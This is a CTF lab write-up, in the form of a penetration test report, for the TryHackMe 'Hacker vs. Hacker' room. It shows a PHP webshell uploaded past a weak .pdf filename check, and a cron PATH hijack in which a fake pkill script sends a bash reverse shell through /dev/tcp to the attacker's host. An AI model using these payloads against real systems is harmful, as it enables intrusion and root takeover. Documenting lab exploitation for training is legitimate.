# TryHackMe: Hacker vs. Hacker 

## Executive Summary

This report details the penetration testing engagement on the TryHackMe room "Hacker vs. Hacker" (Difficulty: Easy). The objective was to compromise the target machine, evade existing countermeasures, and obtain both user and root flags. The engagement successfully identified and exploited a file upload vulnerability on the web application, leading to initial access. Subsequent enumeration revealed credentials, but a persistent anti-forensic mechanism (cron job) required bypassing via path manipulation to achieve root access.

**Key Findings:**
- **Vulnerability Exploited:** Unrestricted file upload allowing webshell execution.
- **Initial Access:** Webshell via PHP file upload.
- **Privilege Escalation:** Bypassed cron-based session killer by hijacking PATH and executing reverse shell.
- **Flags Obtained:** 

**Recommendations:** Implement proper file type validation, restrict upload directories, and monitor cron jobs for persistence mechanisms.

## Methodology

The penetration test followed a structured approach based on the MITRE ATT&CK framework and standard offensive security practices:

1. **Reconnaissance:** Passive and active scanning to identify open ports and services.
2. **Enumeration:** Directory brute-forcing and web application analysis.
3. **Exploitation:** Vulnerability identification and initial access.
4. **Privilege Escalation:** Lateral movement and root access.
5. **Post-Exploitation:** Flag retrieval and cleanup.

All actions were performed ethically within the confines of the CTF environment.

## Reconnaissance

### Port Scanning

Performed an Nmap scan to identify open ports and services on the target IP (10.201.4.127).

**Command:**
```bash
nmap -sC -sV 10.201.4.127 -oN nmap_report
```

**Results:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 19:28 WIB
Nmap scan report for 10.201.4.127
Host is up (0.39s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)
|   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)
|_  256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: RecruitSec: Industry Leading Infosec Recruitment
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.94 seconds
```

**Analysis:**
- Port 22 (SSH): OpenSSH 8.2p1 on Ubuntu.
- Port 80 (HTTP): Apache 2.4.41 on Ubuntu, hosting a recruitment website ("RecruitSec").
- OS: Ubuntu Linux.

## Enumeration

### Web Directory Brute-Forcing

Used Gobuster to enumerate directories and files on the web server.

**Command:**
```bash
gobuster dir -u http://10.201.4.127 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .php,.py,.txt,.md --timeout 30s
```

**Results:**
```
/.php
/images
/upload.php
/css
```

**Analysis:**
- `/upload.php`: Appears to be a file upload endpoint, potentially vulnerable.

### Web Application Analysis

Visited `http://10.201.4.127/upload.php` and observed a message: "Hacked! If you dont want me to upload my shell, do better at filtering!"

Viewed the page source to understand the upload logic:

```html
<!-- seriously, dumb stuff:

$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}

-->
```

**Vulnerability Identified:** The code checks for ".pdf" in the filename but does not validate the file extension properly. Files can be uploaded with a ".pdf.php" extension to bypass the filter and execute PHP code.

## Exploitation

### Webshell Upload

1. Created a PHP webshell file named `shell.pdf.php` with the following content:
   ```php
   <?php system($_GET['cmd']); ?>
   ```

2. Uploaded the file via the `/upload.php` endpoint.

3. Accessed the webshell at `http://10.201.4.127/cvs/shell.pdf.php?cmd=id`.

**Output:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Success:** Achieved remote code execution as `www-data` user.

### Initial Enumeration via Webshell

- Listed directory contents: `http://10.201.4.127/cvs/shell.pdf.php?cmd=ls`
  ```
  index.html
  shell.pdf.php
  ```

- Enumerated `/home`: `http://10.201.4.127/cvs/shell.pdf.php?cmd=ls%20/home`
  ```
  lachlan
  ```

- Listed user directory: `http://10.201.4.127/cvs/shell.pdf.php?cmd=ls%20/home/lachlan`
  ```
  bin
  user.txt
  ```

- Retrieved user flag: `http://10.201.4.127/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/user.txt`
  ```
  thm{*************}
  ```

- Checked bash history: `http://10.201.4.127/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/.bash_history`
  ```
  ./cve.sh
  ./cve-patch.sh
  vi /etc/cron.d/persistence
  echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
  ls -sf /dev/null /home/lachlan/.bash_history
  ```

**Credentials Extracted:**
- Username: `lachlan`
- Password: `thisistheway123` (from the passwd command output)

## Privilege Escalation

### SSH Access Attempt

Attempted SSH login with extracted credentials:

**Command:**
```bash
ssh lachlan@10.201.4.127
```

**Result:** Login successful, but session terminated immediately with "nope" message.

**Analysis:** Anti-forensic mechanism in place to kill SSH sessions.

### Identifying the Countermeasure

Quickly executed commands before timeout. Retrieved `/etc/cron.d/persistence`:

```
PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
```

**Analysis:** Cron job runs every minute, killing all PTY sessions. It uses `pkill`, and PATH includes `/home/lachlan/bin`.

### Bypassing the Countermeasure

1. Created a malicious `pkill` script in `/home/lachlan/bin/` to send a reverse shell instead of killing processes.

**Commands executed via SSH (non-interactive):**
```bash
echo "#!/bin/bash" > /home/lachlan/bin/pkill
echo "bash -i >& /dev/tcp/10.9.1.172/4444 0>&1" >> /home/lachlan/bin/pkill
chmod +x /home/lachlan/bin/pkill
```

2. Set up a Netcat listener on port 4444:
   ```bash
   nc -lvnp 4444
   ```

3. Triggered the cron job by logging in via SSH (the fake `pkill` executes the reverse shell).

**Result:** Received a reverse shell as root.

```
listening on [any] 4444 ...
connect to [10.9.1.172] from (UNKNOWN) [10.201.4.127] 47224
bash: cannot set terminal process group (2822): Inappropriate ioctl for device
bash: no job control in this shell
root@b2r:~#
```

### Root Flag Retrieval

```bash
root@b2r:~# ls
root.txt
snap
root@b2r:~# cat root.txt
thm{*************}
```

## Post-Exploitation

- No further actions taken beyond flag retrieval.
- The reverse shell was established for demonstration purposes only.

## Conclusion

The target was successfully compromised through a combination of web application vulnerability exploitation and creative bypassing of anti-forensic measures. The engagement highlights the importance of secure file upload implementations and monitoring of system persistence mechanisms.

**Lessons Learned:**
- Always validate file types server-side, not just client-side.
- Regularly audit cron jobs and PATH configurations.
- Implement logging and alerting for anomalous activities.

This writeup serves as a step-by-step guide for educational purposes in the context of TryHackMe CTF challenges.
